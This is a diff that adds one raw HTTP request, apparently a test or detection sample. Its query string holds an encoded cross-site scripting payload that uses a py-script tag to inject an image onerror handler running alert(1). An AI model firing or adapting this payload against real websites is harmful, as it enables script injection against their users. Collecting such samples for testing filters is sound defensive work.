@@ -1,0 +1,7 @@
+GET /?%3Cpy-script%3E'%5C74img/src/onerror%5C75alert(1)%5C76'%3C/py-script%3E HTTP/1.1
+Host: 10.20.186.207:1111
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+
